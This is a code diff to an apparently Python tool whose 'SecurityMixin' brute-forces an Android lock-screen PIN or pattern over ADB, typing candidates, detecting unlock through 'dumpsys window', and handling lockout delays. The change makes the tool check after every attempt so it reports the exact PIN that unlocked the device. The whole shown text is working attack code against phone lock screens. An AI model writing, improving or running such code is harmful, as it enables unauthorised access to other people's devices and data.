@@ -529,6 +529,7 @@ class SecurityMixin:
 
             current = start_value
             count = 0
+            found_pin = None
 
             if lock_type == "pin":
                 while should_continue() and current < max_attempts:
@@ -539,56 +540,38 @@ class SecurityMixin:
 
                     for digit in pin_value:
                         subprocess.run(
-                            [
-                                adb_cmd,
-                                "-s",
-                                serial,
-                                "shell",
-                                "input",
-                                "text",
-                                digit,
-                            ],
-                            capture_output=True,
-                            text=True,
+                            [adb_cmd, "-s", serial, "shell", "input", "text", digit],
+                            capture_output=True, text=True,
                         )
                         time.sleep(0.1)
 
                     subprocess.run(
-                        [
-                            adb_cmd,
-                            "-s",
-                            serial,
-                            "shell",
-                            "input",
-                            "keyevent",
-                            "KEYCODE_ENTER",
-                        ],
-                        capture_output=True,
-                        text=True,
+                        [adb_cmd, "-s", serial, "shell", "input", "keyevent", "KEYCODE_ENTER"],
+                        capture_output=True, text=True,
                     )
 
                     current += 1
                     count += 1
 
-                    if count % 5 == 0:
-                        locked_check = subprocess.run(
-                            [adb_cmd, "-s", serial, "shell", "dumpsys", "window"],
-                            capture_output=True,
-                            text=True,
-                        )
-                        if (
-                            locked_check.returncode == 0
-                            and "mDreamingLockscreen=false" in locked_check.stdout
-                        ):
-                            log_callback(f"SUCCESS! Device unlocked with PIN: {pin_value}")
-                            break
+                    # Check after every attempt so we report the exact PIN
+                    locked_check = subprocess.run(
+                        [adb_cmd, "-s", serial, "shell", "dumpsys", "window"],
+                        capture_output=True, text=True,
+                    )
+                    if (
+                        locked_check.returncode == 0
+                        and "mDreamingLockscreen=false" in locked_check.stdout
+                    ):
+                        found_pin = pin_value
+                        log_callback(f"SUCCESS! Device unlocked with PIN: {pin_value}")
+                        break
 
+                    # Tap to dismiss failed attempt and check for lockout every 5 tries
+                    if count % 5 == 0:
                         subprocess.run(
                             [adb_cmd, "-s", serial, "shell", "input", "tap", "500", "1000"],
-                            capture_output=True,
-                            text=True,
+                            capture_output=True, text=True,
                         )
-
                         timeout_text = self._check_lockout_message(adb_cmd, serial)
                         self._handle_lockout_wait(timeout_text, log_callback, should_continue)
 
@@ -665,6 +648,7 @@ class SecurityMixin:
                             locked_check.returncode == 0
                             and "mDreamingLockscreen=false" in locked_check.stdout
                         ):
+                            found_pin = pattern
                             log_callback(f"SUCCESS! Device unlocked with pattern: {pattern}")
                             break
 
@@ -673,7 +657,7 @@ class SecurityMixin:
 
                         time.sleep(delay_ms / 1000)
 
-            if should_continue():
+            if not found_pin and should_continue():
                 log_callback("Brute force completed without finding the correct combination.")
 
         except Exception as exc:
